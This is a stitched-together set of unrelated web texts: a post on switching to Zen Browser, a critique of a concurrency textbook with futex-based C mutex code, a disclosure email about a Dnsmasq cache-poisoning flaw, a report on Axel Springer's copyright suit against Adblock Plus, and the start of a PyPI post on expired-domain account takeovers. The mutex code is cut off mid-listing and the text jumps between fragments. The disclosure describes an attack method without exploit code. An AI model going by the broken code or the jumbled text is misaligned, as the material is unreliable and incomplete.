            <p>A few years ago, I moved to&nbsp;<a href="https://arc.net/?ref=werd.io">Arc</a>&nbsp;as my default browser. I felt like everything was immediately upgraded: finally, a web browser worked how I needed it to. The interface got out of the way; it was superpowered with keyboard shortcuts that just made sense (a bit like other professional tools like&nbsp;<a href="https://superhuman.com/p?ref=werd.io">Superhuman</a>); and its profiles feature allowed me to fully sandbox my work activity away from my personal activity. It’s how I want a browser to work.</p><p>Unfortunately, it didn’t live up to the goals its vendor,&nbsp;<a href="https://www.thebrowser.company/?ref=werd.io">The Browser Company</a>, had set up for it. It was a niche tool for a certain kind of power user, which didn’t justify the company’s valuation. Had it been a product made by an independent company, I would have gladly paid for it, and it might have formed the basis of a sustainable business. But&nbsp;<a href="https://techcrunch.com/2025/05/27/the-browser-company-mulls-selling-or-open-sourcing-arc-browser-amid-ai-focused-pivot/?ref=werd.io">The Browser Company needed scale</a>, and it was not to be.</p><p>Instead, The Browser Company took advantage of the buzz around AI, and&nbsp;<a href="https://techcrunch.com/2025/06/11/the-browser-company-launches-its-ai-first-browser-dia-in-beta/?ref=werd.io">created a new, AI-focused browser called Dia</a>. Rather than build these features into Arc, the company tried again: it lost most of Arc’s power user features and added AI to a browser framework that isn’t a million miles away from stock Chrome. The learning curve was removed, but so was the utility. Meanwhile,&nbsp;<a href="https://www.engadget.com/ai/the-browser-company-stops-active-development-of-arc-in-favor-of-new-ai-focused-product-153045276.html?ref=werd.io">Arc is not gone, but it’s certainly on life support, with no new features planned</a>.</p><p>I tried to love Dia, but I’m not bullish about it. It really has lost the power user features that made Arc special: the excellent tab sidebar is gone and profile switching is nowhere near as fluid. But it also has far more competition:&nbsp;<a href="https://www.perplexity.ai/comet?ref=werd.io">Perplexity has introduced Comet</a>, its own AI browser,&nbsp;<a href="https://www.google.com/chrome/ai-innovations/?ref=werd.io">and Chrome itself has built-in Gemini features</a>. It’s not clear why Dia would do better. And ironically,&nbsp;<a href="https://www.diabrowser.com/pro?ref=werd.io">The Browser Company now charges $20/month</a>, the same amount I would gladly have paid for Arc. Unless The Browser Company has something amazing up its sleeve, I think it’s destined for an acquisition that might see features from its own products incorporated into someone else’s.</p><p>Because Dia is heavily oriented around contextual AI, I’m also worried about the privacy of my browsing. One feature allows your discussions with an AI model to be informed by your recent browsing history, which requires sending a supposedly-protected version of that history to their servers. No thanks: that’s a judgment call for my personal data, but it’s an absolute no-go for my work browsing. You can turn that feature off, but it’s not a given that this contextual information isn’t shared any other way.</p><p>Which left me hunting for another browser. I cannot compromise my data, and I’m not interested in investing in a product that I think will be going away soon.</p><p>Firefox remains the gold standard for user-first browsing. Unfortunately, while the original Firefox was a huge step forward in browsing user experience (certainly over the original Mozilla browser, but also over everything else at the time), it now feels pretty clunky. Each function works well, but it doesn’t feel like much thought has been put into the experience of using Firefox overall; the user journey to get things done often feels disjointed, and the browser interface is always there, taking up screen real estate. It was my first stop as a replacement once I chose to move on from Dia, but I pined for the power user features I enjoyed with Arc. It’s fine but not delightful.</p><p>So I was pleased to rediscover&nbsp;<a href="https://zen-browser.app/?ref=werd.io">Zen Browser</a>, which has improved in leaps and bounds since I last tried it. It has a very Arc-inspired UI that gets out of your face quickly, with all the customization and keyboard shortcuts you’d expect from something built on top of Firefox. I use vertical tabs in a sidebar that auto-hides, and I can navigate just as smoothly as I ever did with Arc.</p><p>The Firefox framework itself has gained&nbsp;<a href="https://support.mozilla.org/en-US/kb/profile-management?ref=werd.io">a new profile manager</a>, which is the last remaining piece. Although you have to turn it on through a switch buried deep in your settings, once you do, you can easily flip between browser contexts, and I can once again have fully independent work and personal browser windows. The previous one looked like it had been built in Perl in 1996, and was really optimized to use via the command line; the new one is what you’d expect from a browser that cares about non-developer users.</p><p>To be clear, there are some weird quirks. Keyboard shortcuts have to be set up for every profile, which doesn’t make sense to me. Computers are typically single-user, and profiles are for different contexts, not people; unifying shortcuts across them should at least be an option. And&nbsp;<a href="https://support.mozilla.org/en-US/kb/how-do-i-set-sync-my-computer?ref=werd.io">syncing with a Firefox account</a> only works one profile at a time, so if you want to sync multiple profiles, you need to create multiple Firefox accounts. (I've chosen to sync my personal profile but not my work data.) But these are all weirdnesses that are inherited from the core Firefox product; Zen Browser has made the best of these raw ingredients and built something pretty special.</p><p>So, as of now, it’s my default browser. It can be yours, too:&nbsp;<a href="https://zen-browser.app/download/?ref=werd.io">it works across all major desktop platforms</a>. I think, right now at least, that it’s the best of the bunch.</p><p>But I do have a question. Given how much better Zen is than stock Firefox,&nbsp;<em>why isn’t it Firefox?</em>&nbsp;Mozilla should take this team, absorb it, and use it to help navigate the future of their flagship browser for end users. Firefox is a great framework for developers to innovate their own browser experiences, but it also needs a default way for users to experience its functionality. Zen Browser should be it.</p>

<div id="readability-page-1" class="page"><div><main><article><div><p><a href="https://eatonphil.com/">Phil Eaton’s</a> <a href="https://eatonphil.com/2025-art-of-multiprocessor-programming.html">book club</a> is starting
<u>The Art of Multiprocessor Programming, 2nd Edition</u>
, which is a <em>very</em> well regarded textbook, and pretty recently updated (2021). I’ve even heard of a couple of authors.</p><p>I’ve done a lot of concurrent programming, and have always felt like I’ve still got plenty to learn, so I was excited for the topic. So far, what I’ve learned is that I would never recommend this book, despite any merits.</p><p>Academia certainly struggles to find the right balance between teaching foundational principles and practical information. Being this book is explicitly targeting fourth-year undergraduates and grad students, it should definitely cover the fundamentals, right?</p><p>So how the heck could it not cover the <em>futex</em>??</p><h2 id="isnt-that-just-a-type-of-mutex-surely-the-futex-cant-be-that-important">Isn’t that just a type of mutex? Surely the futex can’t be THAT important?</h2><p>The name sure sounds like “mutex”, and that <strong>is</strong> where the name comes from: “fast, user space mutex”. But, it isn’t really, it’s a building block for concurrency primitives that ushered in a modern world of concurrent performance that makes System V (sysv) feel so old and busted, it feels wrong to even call it a dinosaur 🦖, as if it were once mighty?</p><p>Way back in the last millennium, locking primitives were pretty much all based on the System V IPC (inter-process communication) code, specifically their semaphore code. All common concurrency primitives were over-complicated under the hood, and just didn’t scale well to large numbers of threads.</p><p>Until Linux added the futex.</p><p>Going back to the <a href="https://www.kernel.org/doc/ols/2002/ols2002-pages-479-495.pdf">original futuex paper</a> in 2002, it was immediately clear that the futex was a huge improvement in highly concurrent environments. Just in that original paper, their tests with 1000 parallel tasks ran <em>20-120 times faster</em> than sysv locks..🤯</p><p>Needless to say, other common operating systems followed suit, including Windows in 2012 and macOS by 2016.</p><p>These days, any <strong>good</strong> locking primitive is going to be based on a futex. You should expect system libraries like <code>pthreads</code> will use the futex extensively.</p><h2 id="wait-a-futex-isnt-a-mutex-so-what-is-it-then">Wait, a futex isn’t a mutex? So what is it, then?</h2><p>When there’s too much contention for a lock, actively trying to acquire it as fast as possible will just eat CPU that other threads could be using for work, to just sit there and wait.</p><p>It’d be nice to be able to clear up that CPU and put the thread to sleep until the lock is ready.</p><p>Unless you’re essentially going to build your own thread scheduling implementation in user-space (which is basically what async implementations do at their core), you either need to poll, which is inefficient, or you need operating system support.</p><p>In sysv IPC, the core tool for getting OS-supported blocking when building higher-level concurrency program was the <em>semaphore</em>, which <strong>intertwined locking and waiting</strong>.</p><p>The <em>futex</em> essentially separates the <em>locking</em> from <em>waiting (and waking)</em> tasks.</p><p>The flexibility you get from separating those two concerns is key to good lock performance. It becomes much easier to avoid unnecessary delays (like sleeps with exponential backoffs) and bottlenecks, particularly <strong>system calls themselves</strong>, which are quite expensive compared to most of the code involved in locking.</p><p>For instance, if you’re building a mutex, your unlock operation can skip calling into the kernel for the unlock operation if you can be confident in userland that no threads are waiting. In sysv land, an unlock was always a system call.</p><p>Essentially, the futex <code>wait()</code> call allows a task to block, queuing that task inside the kernel, on a list specifically associated with a particular memory address, and allows an optional timeout.</p><p>The <code>wake()</code> operation will dequeue threads from the internal list, running them again. You can choose how many to wake, but generally, the code will wake either 1 or all of them, never anything in between.</p><p>People often describe the futex as, <strong>“Wait on memory address”</strong>. That overlooks the notification side, but it’s a much more apt name, and why Windows’ name for this API (<code>WaitOnAddress</code>) is superior API naming (to be fair, they did have a decade to think about the name).</p><p>The memory address you’re waiting on tends to be a 32-bit integer, sometimes a 64-bit integer. The OS doesn’t care much about the semantics of the value inside that integer. However, and very importantly, when calling the <code>wait()</code> operation, the caller <em>must</em> present what it thinks the value of the futex is. If the value has changed, the operation fails.</p><p>Providing the value protects from waiting for a wake that has already happened. Whenever you need to wait, you’re waiting for some particular state to occur. The OS doesn’t care about the specifics of how your state is encoded in the futex, since it’s responsible for the order of operations on the futex; it won’t enqueue a waiter with an incorrect view of the current state.</p><p>For example, let’s say you’re a thread who wants to wait for state <code>Y</code> (which might be availability of a lock), and you have checked, and you think the state is <code>X</code> (say… locked).

</span></span></code></pre></div><p>It might not be intuitive why the above lock works. The <code>atomic_fetch_or()</code> operation performs a bit-wise OR, but returns the value from before the operation began. As implied by the “function” name, the entire operation happens atomically, and in reality, won’t be a proper function; it’ll most likely inline to a tiny bit of assembly.</p><p>Let’s say 100 threads are contending for the lock, and let’s just imagine no thread gives up the lock, either. We use the version of this API that guarantees sequential consistency. As a result, at runtime, all threads will essentially perform the OR, but only one will see <code>0</code> as a return value. That’s the thread that gets the lock.</p><p>Many people are surprised that any lock can be built with only single bit, but there you go.</p><p>Still, our simple spin lock has some potential problems:</p><ol><li>It doesn’t deal with heavy contention (i.e., it doesn’t provide a way to offload CPU via waiting).</li><li>If a thread mistakenly calls our <code>unlock</code> operation on a lock it doesn’t own, it’ll unlock the lock 😱</li><li>If a thread recursively tries to acquire this lock, it’ll end up blocked, waiting for a lock it already holds– deadlock!</li></ol><p>Some people wouldn’t consider the last one a real problem, as we’ll discuss later. But the other two are definitely worth addressing.</p><p>Anyway, let’s show how we can deal with all of these issues.</p><h2 id="when-and-how-to-block">When and how to block</h2><p>Most libraries will have separate APIs for spin locks and mutexes.</p><p>Yet, good mutex implementations <em>do</em> tend to start with a spin lock, and if they try some number of times and fail, then there’s too much contention, so they wait.</p><p>If the lock is uncontended, the spin lock will be successful on the first try, and will be pretty fast – no system call. With light contention and a short critical section, we may still get the lock without having to make the system call to wait.</p><p>One thing I wanted to see from the book was guidance on how long mutexes should spin for. Surely, there’s not a one-size-fits-all answer, especially as hardware platforms evolve. Clearly, the overhead of a system call, the number of tasks, and the duration of the critical section could all come into play, but does anyone have any metrics here?</p><p>Personally, I just tend to use a hard-coded <code>16</code> iterations, but with no strong reason. I suppose I probably saw someone else use it once, but also with no explanation.</p><p>When it comes to dealing with contention, the book covers exponential back-off – when you don’t get the lock due to contention, you exponentially increase the time you wait, in an attempt to try to spread out contention (usually, exponential backup stops at some maximum duration, which usually comes after 5-8 failed attempts).</p><p>But what do they tell you to do?? Call <code>sleep()</code> for the backoff period. What if contention clears right as you put yourself to sleep? You wait anyway, and while perhaps you had the opportunity to take the lock uncontested had you kept spinning, and you might get really unlucky, and the contention could come back right as you’re waking up.</p><p>By the way, blocking is <strong>so</strong> overlooked in this book; they don’t even <em>mention</em> the word polling (I bought the e-book and searched extensively). This issue with using <code>sleep()</code> to block certainly isn’t mentioned, even when it’s casually tossed into their code.</p><p>You probably have an inkling already– the futex is how modern locks avoid these problems.</p><p>If a futex is available, exponential backoff (or any polling-based approach) makes little sense. With polling, wakes are essentially arbitrary guesses. With the futex, wakes are explicitly tied to the mutex becoming available.</p><p>When there’s significant contention with a polling-based approach, if we don’t use exponential back-off, we could end up with many threads continuing to wake up all at the same time, just to contend with each other again.</p><p>With a futex, we can just wake up a single thread (which might have to contend with new threads coming in).</p><p>Let’s build it, even though we still won’t be dealing with recursion or accidental unlocks.</p><p>Given the risk of accidental unlock, we’ll call this our “unsafe” mutex.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#define H4X0R_SPIN_COUNT 16

However, in many cases, mutex access will be totally uncontested, and we’ll be making a system call to wake up… nobody.</p><p>There are ways to address this pretty simply, allowing us to avoid <em>most</em> spurious wakeups. We’re only using one bit of our futex, and it doesn’t actually matter which bit. So we’re going to move the bit up to the top, and use the rest as a wait-counter.</p><p>We’ll have threads add to it before they first try to go to sleep, and subtract when they wake up. When the thread holding the lock unlocks the mutex, we’ll use <code>atomic_fetch_and()</code> to remove the mutex’s <strong>lock</strong> flag, but leave all other bits intact, and we’ll then look to see if the wait-count is zero. If it is, we’ll skip the wake-up.</p><p>This can still lead to <em>some</em> extra system calls:</p><ol><li><p>The mutex could get released after the thread added its value to wait count, but before it actually puts itself to sleep.</p></li><li><p>Other threads may end up adding to the count and going to sleep once we’ve released, and after another thread grabbed the lock.</p></li></ol><p>The first case seems scary; it won’t risk a deadlock, because if the unlock happens before the wait, the waiting thread will have the wrong expected value, and the futex call will fail.</p><p>The second case leads to a spurious wake-up. The woken thread checks the futex again, sees it’s locked, and goes back to sleep, but that’s two extra system calls.</p><p>Still, this is going to avoid plenty of unnecessary wakes and system calls in practice.</p><p>Using this idea, let’s build our second mutex. This version is also unsafe, because we’re not yet dealing with ownership, so we’ll modify calls with <code>unsafe2</code>.

Much like <code>atomic_fetch_or()</code>, the function <code>atomic_fetch_add()</code> will return the value there <strong>BEFORE</strong> our modification.</p><p>But, we’re going to have to tell the futex routine what value we think is there when we go to wait, so we <em>also</em> need to add to the wait count on the value that gets returned.</p><p>Notice that, when we do add to the wait count, it doesn’t matter how many times we wake from the futex; we only add ourselves one time, and remove ourselves only once we <em>acquire</em> the lock. We definitely don’t want ourselves to be counted when we test to see if we should make the system call to wake a waiter.</p><p>Here too, <code>atomic_fetch_and()</code> will return a value before our operation is applied. So in this mutex, if there are no waiters at the point of our atomic operation, the value we get back will actually be <code>H4X0R_MUTEX1_LOCK_ON</code>, even though we will have just set the mutex’s value to <code>0</code>.</p><p>Here, we don’t redo the operation; we just make the proper comparison.</p><h2 id="asserting-ownership">Asserting Ownership</h2><p>Dealing with ownership isn’t too big a deal; we just need to keep track of who owns the lock, if anyone, and check it when it’s safe to do so.</p><p>We’ll use <code>pthread_t</code> for identity, which we can directly store and compare, even though it has a slight issue– the underlying implementation of the data structure is implementation-dependent.</p><p>This means we can’t 100% reliably keep track of the thread with just the <code>pthread_t</code> value, because we don’t know a portable value that says “not a thread.” The easiest thing for us to do is just take up some more space, and keep a flag to keep track of whether it’s owned or not, for when we are checking ownership.</p><p>Once we check ownership, our mutex is safe, so this will be our default mutex type (we’ll modify this code to make a recursive mutex later).</p><p>Here, then, is our new mutex definition and initializer:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>typedef</span> <span>struct</span> {

There are platforms (like ARM) where you’re particularly at risk of issues if you’re not really careful. When in doubt, go for full sequential consistency.</p><p>The atomics do force sequential consistency when we update those fields. Without it, we might end up with, for instance, thread A yielding the futex, but their ownership flag still being set when thread B quickly grabs the lock.</p><p>In the rest of this implementation, we’re going to take the same basic approach we did with the previous mutex, with the significant changes (besides moving from a uint32_t only to a data structure) being:</p><ol><li>When we unlock a mutex, we’ll double-check that we own it first.

</span></span></code></pre></div><h2 id="remaining-issues">Remaining issues</h2><p>The core issue we have left is, what happens when a thread exits or dies when a mutex is locked??</p><p>It’s a bit much for us to cover today, but here’s a sketch of what we’d need to do:</p><ol><li>Each thread will need a private list of locks it is actively holding, which we would modify in the calls above.</li><li>In most thread APIs, we can register a callback when a thread exits (or is canceled). We’d need to register a handler for this, probably once per thread, when it’s launched.</li><li>That callback will need to go through the list and break any locks still held.</li><li>Many people won’t worry about crashed threads, as they often will crash the whole program. However, you can catch the signal a crash generates and keep the overall process from terminating. On Linux, you can compare your view of what threads are live with the OS’s view in <code>proc</code>. On other platforms, you might not be able to get the exact thread that crashed. However, if you’re managing threads that launch, you will probably have a way to give yourself visibility into what threads do not check in over a very short time.</li></ol><p>Another related issue comes up once you allow mutexes to span processes via memory shared across processes. The same basic code all works fine, modulo some changes to how to use a futex. Our problem is, what happens when a process holding a lock forks??</p><p>That’s also an issue you can handle if you’re managing all the locks. But if it’s a problem mentioned in the book– I can’t find it, after skimming over <em>31 uses</em> of the word <code>fork</code> (outside the context of cutlery🍴, which gets one use). Those uses are spread across a mere <em>9 pages</em>. Almost all of those uses are talking specifically about algorithms leveraging Java’s <code>ForkJoin</code> class, which is a thread pooling scheme within a process, not a proper posix <code>fork()</code>.</p><h2 id="reading--writing-_the-art--engineering-of-multiprocessor-programming_">Reading / Writing <em>The Art / Engineering of Multiprocessor Programming</em></h2><p>The book being named with the word “Art” is apt, because it’s not really engineering best practices.</p><p>To be fair, the book does mention that some locking primitives are lock-aware and some aren’t. It also shows how to build a recursive lock using a non-recursive lock (in Java, of course).</p><p>But it does so using a condition variable, which is horrible. If you just care about engineering best practices, you should have easy access to a reentrant mutex already (pthreads provides one). I’d expect that to be more performant than a condition variable, which already needs a mutex– it over-complicates the implementation.</p><p>If you’re trying to learn how things work under the hood, the condition variable isn’t giving you what you need to know. What you need to know is the <code>futex</code>, full stop.</p><p>Also, the book doesn’t seem to opine on recursive locks. It just shows them. I think the conventional wisdom on using them in mutexes is important to understand. And, I also think it becomes a different discussion if you’re talking about other concurrency primitives.</p><p>For instance, when using reader-writer locks (RW locks), I think recursive locks are really appropriate, just incredibly hard to get right.</p><p>If you’ve never used an RW lock, they allow any number of readers to lock for reading, all at the same time. If a writer is waiting to lock, it waits for all readers to clear (and in sane implementations, new readers cannot be added with a waiting writer).</p><p>But writers, once they do get the lock, get exclusive access, so they can edit without fear of readers seeing an inconsistent state.</p><p>In concept, that’s a great primitive to use for operations like dynamic lists. If there’s no mutation happening, but there could be lots of parallel reading, reads can end up pretty cheap, because they only have to stop for writes.</p><p>Consider an API call like:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>void</span> <span>h4x0r_list_append_all_contents</span>(<span>h4x0r_list_t</span> <span>*</span>dst, <span>h4x0r_list_t</span> <span>*</span>items);
</span></span></code></pre></div><p>The idea being, we’re going to combine the two lists by copying the contents of the <code>items</code> list onto the end of the <code>dst</code> list.</p><p>Now, we clearly want to grab a write lock on <code>dst</code>. And for <code>items</code>, we definitely want a read lock on that one.</p><p>But, what if we were given that API, and wanted to double a list, by doing:</p><p>I’ve seen APIs like this, where the same item is routinely passed through a nested set of construction operations that can mix reading and mutation. So you might need reads to nest, you might need writes to nest, all for the same item, in the same chain of calls.</p><p>We’d have no problems building an API that could handle such things in a program without concurrency, as long as we anticipate the need and fix the number of items to copy in before we start.</p><p>But in a multi-threaded app, if we don’t allow nested locks, we now also have to anticipate <em>every</em> situation where it might make sense for a list to be passed multiple times, and then add code to explicitly test for it.</p><p>So it’d be great to have solid semantics for RW lock nesting. But unfortunately, the POSIX standard leaves recursive locking as undefined behavior, which means that even if a conformant library provides such recursion, you definitely should not use it.</p><p>And in practice, behavior across common implementations is not remotely consistent. There’s a good reason why this was left undefined – it’s kind of hard. Since multiple threads can hold a lock, each thread must have a separate read nesting level.</p><p>And then how do you deal with writes that might be intermingled in there? How do you keep the accounting correct, so that you don’t drop write access too early, for instance?</p><p>These problems are solvable, though (and at some point soon, I’ll share my RW lock).</p><p>But in <em>The Art Of Multiprocessor Programming</em>, I can’t find any mention of such issues, neither warning you about the semantic challenges that can surprise you, nor showing how such things might be dealt with.</p><p>It’s not a surprise, since they don’t even mention the futex. Nor do they seem to cover async runtimes, despite their popularity (perhaps a bit more excusable since they’re generally multiplexing a single thread, but it still feels too important not to cover well).</p><h2 id="rtfc">RTFC</h2><p>The full source code is available <a href="https://codeberg.org/crashoverride/mutex">on codeberg</a>.</p><h2 id="-in-conclusion-">🏁 In conclusion 🏁</h2><p>I have plenty of other problems with this book, but they’d each probably need their own rant, and I’m not going to spend the time.

<pre>Dear Dnsmasq Security Team,

We would like to responsibly disclose a critical cache poisoning vulnerability affecting the Dnsmasq DNS software. The issue allows attackers to inject arbitrary malicious DNS resource records and poison domain names without requiring advanced techniques, only by leveraging a single special character.

Report Summary

Vulnerability Type: Logic flaw in cache poisoning defense

Affected Software: Dnsmasq (all versions)

Severity: Critical

Exploitability: Off-path attackers can brute-force TxID and source port within an extended attack window

Attack Name:SHAR Attack (Single-character Hijack via ASCII Resolver-silence)

Success Rate: 20/20 successful attack attempts

Average Execution Time: ~9,469 seconds

Key Findings

Dnsmasq forwards queries with special characters (e.g., ~, !, *, _) to upstream recursive resolvers.

Some upstream recursive resolvers silently discard such malformed queries (no NXDomain/ServFail response).

Dnsmasq does not validate or detect this situation, and waits silently, creating a large attack window.

During this window, attackers can brute-force TxID (16-bit) and source port (16-bit) with a high probability of success (birthday paradox effect).

Security Impact

Attackers can poison any cached domain name in Dnsmasq.

Attack is feasible off-path without IP fragmentation or side-channels.

This vulnerability also amplifies known cache poisoning attacks such as SADDNS and Tudoor.

Undermines DNS security assumptions that resolver silence is benign.

Proof of Concept

We tested against a real domain (viticm.com) and demonstrated that queries containing certain crafted characters lead to upstream silence. This allowed us to reliably poison Dnsmasq caches in all trials.

Suggested Mitigation

We recommend adding:

Detection mechanisms when upstream resolvers remain silent.

Rate limiting and spoof-detection techniques, similar to those in PowerDNS.

References

RFC1034: <a href="https://datatracker.ietf.org/doc/html/rfc1034">https://datatracker.ietf.org/doc/html/rfc1034</a>

RFC2182: <a href="https://datatracker.ietf.org/doc/html/rfc2182">https://datatracker.ietf.org/doc/html/rfc2182</a>

PowerDNS Mitigation: <a href="https://docs.powerdns.com/recursor/settings.html#spoof-nearmiss-max">https://docs.powerdns.com/recursor/settings.html#spoof-nearmiss-max</a>

We believe this issue requires urgent attention due to the wide deployment of Dnsmasq. Please let us know how we can assist further with coordinated disclosure, additional PoC details, or testing.

There’s little doubt that online businesses reliant on advertising revenue are negatively affected by increasing use of ad blocking solutions.</p>
<p>Yet it’s thanks to abusive and invasive ads, and threats to privacy due to incessant online tracking, that ad blockers became so popular. </p>
<p>There’s a good argument today that an effective ad blocking solution is not just a way to keep out an avalanche of mostly unwanted advertising. In many cases ad blockers are seen as an essential tool in the internet user’s security toolbox and as a result, people are reluctant to turn them off.</p>
<h2>Axel Springer Acquires Target, Misses, Switches to New Weapon</h2>
<p>For German publisher Axel Springer, ad blocking solutions are mechanisms that fundamentally undermine the company’s ability to generate revenue. Hoping to force change, over a decade ago the company took legal action against Eyeo GmbH, the company behind <a href="https://adblockplus.org/">Adblock Plus</a>, arguing that the software interfered with its business model. In April 2018, Adblock Plus and Eyeo came out on top, when Germany’s Supreme Court found no breach of competition law. </p>
<p>Still determined to take ad blocking out of the game, Springer changed tack. In a new lawsuit, the publisher alleged that AdBlock Plus  removes ads by interfering with the “programming code of websites” which violates its exclusive rights under copyright law. </p>
<p>Eyeo dismissed the claim as “almost absurd” and in January 2022 the Hamburg Regional Court denied Springer’s request for an injunction, ruling that there was no unauthorized copying or reworking of copyrighted computer programs as defined under local law. </p>
<p>Springer appealed and in 2023 <a href="https://juris.bundesgerichtshof.de/cgi-bin/rechtsprechung/document.py?Gericht=bgh&amp;Art=en&amp;az=IV%20ZR%20131/23&amp;nr=137405">lost again</a>, this time at the Higher Regional Court of Hamburg. Refusing to accept defeat, the publisher filed yet another appeal at the <a href="https://www.bundesgerichtshof.de/SharedDocs/Pressemitteilungen/DE/2024/2024107.html">Federal Court of Justice</a> (BGH).</p>
<h2>Treatment of Software Under German Copyright Law</h2>
<p>While competition law may have been a dead end, copyright law can offer novel opportunities for the determined.</p>
<p>Axel Springer’s argument is built on provisions in German copyright law for the protection of software. According to <a href="https://dejure.org/gesetze/UrhG/69a.html">§ 69a para. 3 UrhG</a>, a piece of software (‘computer program’) is afforded protection under copyright law if it “represents an individual work to the extent that it is the result of the author’s own intellectual creation.” </p>
<p>Protection applies to “all forms of expression” in the program but does not extend to “ideas and principles” underlying its elements. This effectively means that people can’t copy or distribute a piece of software verbatim, but they are free to write their own version of the software as long as there’s no direct copying of the original.</p>
<p>In more general terms, computer programs are treated as literary works under the Copyright Act and as such enjoy the same protection. This means that the author of a computer program (or their employer) holds exclusive rights to reproduce, distribute and make the program publicly available, just as an author of a book would.</p>
<h2>Springer Argues Websites Are Computer Programs</h2>
<p>Axel Springer argues that the software used to create its online media presence (i.e its website) qualifies for protection as software under <a href="https://dejure.org/gesetze/UrhG/69a.html">§ 69a (1) and (2)</a> of the Copyright Act.</p>
<center><em>§ 69a – Definition of software (German Copyright Act)</em><img loading="lazy" decoding="async" src="https://torrentfreak.com/images/DE-Copyright-Act-s69a.png" alt="DE Copyright Act s69a" width="670" height="238" srcset="https://torrentfreak.com/images/DE-Copyright-Act-s69a.png 1402w, https://torrentfreak.com/images/DE-Copyright-Act-s69a-300x106.png 300w, https://torrentfreak.com/images/DE-Copyright-Act-s69a-600x213.png 600w, https://torrentfreak.com/images/DE-Copyright-Act-s69a-150x53.png 150w" sizes="auto, (max-width: 670px) 100vw, 670px"></center>
<p>Based on the assumption that its software does indeed qualify for protection under § 69a, Axel Springer notes that further protection is afforded under § 69c, with certain exclusive rights granted to the rightsholder. </p>
<p>Under § 69c, third parties must obtain permission for any of the following acts:</p>
<center><em>§ 69c – Exclusive rights for qualifying software under § 69a (German Copyright Act)</em><img loading="lazy" decoding="async" src="https://torrentfreak.com/images/DE-Copyright-Act-s69c.png" alt="DE Copyright Act s69c" width="670" height="298" srcset="https://torrentfreak.com/images/DE-Copyright-Act-s69c.png 1409w, https://torrentfreak.com/images/DE-Copyright-Act-s69c-300x133.png 300w, https://torrentfreak.com/images/DE-Copyright-Act-s69c-600x267.png 600w, https://torrentfreak.com/images/DE-Copyright-Act-s69c-150x67.png 150w" sizes="auto, (max-width: 670px) 100vw, 670px"></center>
<blockquote><p><em>§ 69c (2) “the translation, adaptation, arrangement and other modifications of a computer program as well as the reproduction of the results obtained.”</em></p></blockquote>
<p>Axel Springer’s argument is that when Adblock Plus blocks or manipulates its website code (‘computer program’) present in the user’s browser, that amounts to a violation of its exclusive right of modification available under § 69c (2) and its reproduction right under § 69c (1).</p>
<h2>Federal Court of Justice Overturns Decision of Lower Court</h2>
<p>The above matters and others focused on the technical issues are detailed in the ruling handed down by the Federal Court of Justice (BGH). The ruling (<a href="http://juris.bundesgerichtshof.de/cgi-bin/rechtsprechung/document.py?Gericht=bgh&amp;Art=en&amp;client=12&amp;pos=0&amp;anz=1&amp;Blank=1.pdf&amp;nr=142511">Werbeblocker IV / Ad Blocker IV</a>) is clearly a setback for Eyeo GmbH; the Higher Regional Court of Hamburg previously ruled in favor of the Cologne-based company, a decision the BGH has just overturned.</p>
<p>In a nutshell, the BGH states that the Hamburg court arrived at its decision without first establishing important fundamentals. These details may support the decision of the Hamburg court or undermine it, but that can only be determined once the facts are established.</p>
<blockquote><p><em>“When examining whether an infringement of a copyrighted right to a protected object (here: a computer program within the meaning of Section 69a (1) of the Copyright Act) has occurred, it is not always necessary to determine whether this protected object meets the requirements of a copyrighted work, computer program, or related right. Rather, this circumstance can be assumed, provided that there is no unlawful infringement of copyright,” the decision reads.</em></p><em>
</em><p><em>“It should be noted, however, that the question of an infringement of a property right may depend on a clear definition of the protected object and its features justifying protection. Denying an infringement of a copyright-protected right while simultaneously assuming that the protected object in question is eligible for copyright protection is therefore only possible in such a case if the object itself deemed to be protected by copyright and the features justifying its protection are clearly defined.”</em></p></blockquote>
<h2>Technical Matters</h2>
<p>Lubberger Lehment, the law firm acting for Axel Springer, highlights a technical aspect mentioned in the BGH decision which it believes warrants much closer attention. </p>
<p>“In particular, the Higher Regional Court did not sufficiently consider Axel Springer’s argument that a browser is a virtual machine controlled by a website program as byte code. In its reasoning, the Federal Supreme Court quotes in unusual detail what we presented with the help of external experts,” their statement reads.</p>
<p>The decision notes that this is not just about “changing variable data in the memory of a computer, but rather changing code created by the bytecode of the website ‘computer program’ as a form of expression of the website programming itself.”</p>
<p>For those interested in the technical argument, full details are available in the decision <em>(<a href="https://juris.bundesgerichtshof.de/cgi-bin/rechtsprechung/document.py?Gericht=bgh&amp;Art=en&amp;client=12&amp;pos=0&amp;anz=1&amp;Blank=1.pdf&amp;nr=142511">pdf</a>, German)</em>. Which elements will make or break the case, if any, is still unclear.</p>
<h2>Outcome Could Have Far-Reaching Implications</h2>
<p>The scale of the fallout from an Axel Springer win could be significant and given the background, hard to balance in the bigger picture. Switching to copyright law purely because competition law proved insufficient, suggests that copyright may have been viewed as a means to an end. Whether wider disruption will find balance in the benefits claimed by the plaintiffs is another question.</p>
<p>Lubberger Lehment state that the case isn’t just about protecting the integrity of online media.</p>
<p>“It is about the question of whether at all and in what quality online journalism can be offered and used in the future – it is about freedom of information without paywalls. This is fundamental to democracy,” the company writes.</p>
<p>Whether the developer community will come to view the following in a positive light remains to be seen.</p>
<p><em>“[T]he case is of fundamental importance for the entire software industry. This is because all browser applications work with the same technical components, namely HTML5, CSS, PHP, and Java Script. This affects all cloud-based applications such as computer games, standard software, SAP, etc. The ad blocker trial will determine whether this future technology is protected by copyright or can be manipulated at will by third parties.”</em></p>

<h2 id="summary">Summary</h2>
<p>PyPI now checks for expired domains to prevent domain resurrection attacks,
a type of supply-chain attack where someone buys an expired domain
and uses it to take over PyPI accounts through password resets.</p>
<p>These changes improve PyPI's overall account security posture,
making it harder for attackers to exploit expired domain names
to gain unauthorized access to accounts.</p>
<!-- more -->

<p>Since early June 2025, PyPI has unverified over 1,800 email addresses
when their associated domains entered expiration phases.
This isn't a perfect solution, but it closes off a significant attack vector
where the majority of interactions would appear completely legitimate.</p>
<h2 id="background">Background</h2>
<p>PyPI user accounts are linked to email addresses.
Email addresses are tied to domain names;
domain names can expire if unpaid, and someone else can purchase them.</p>
<p>During PyPI account registration, <a href="https://policies.python.org/pypi.org/Terms-of-Service/#2-required-information">users are required to verify their email addresses</a>
by clicking a link sent to the email address provided during registration.
This verification ensures the address is valid and accessible to the user,
and may be used to send important account-related information,
such as password reset requests, or for PyPI Admins to use to contact the user.</p>
<p>PyPI considers the account holder's initially verified email address a strong indicator of account ownership.
